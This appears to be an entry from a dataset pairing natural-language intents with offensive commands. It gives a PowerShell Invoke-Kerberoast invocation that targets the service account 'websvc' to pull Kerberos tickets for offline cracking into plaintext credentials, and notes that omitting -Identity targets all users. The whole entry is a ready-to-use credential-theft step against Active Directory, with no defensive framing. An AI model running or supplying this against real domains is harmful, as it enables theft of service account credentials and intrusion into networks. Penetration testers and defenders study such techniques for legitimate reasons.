# Natural language intent:
# perform a Kerberoasting attack, specifically targeting the service account "websvc" to retrieve Kerberos tickets that can be cracked offline to obtain plaintext credentials. The command is configured to target a specific user ("websvc") using the "-Identity" parameter. Without the "-Identity" parameter, the cmdlet would kerberoast tickets for all possible users.

Invoke-Kerberoast [-Identity websvc] #Without "-Identity" kerberoast all possible users
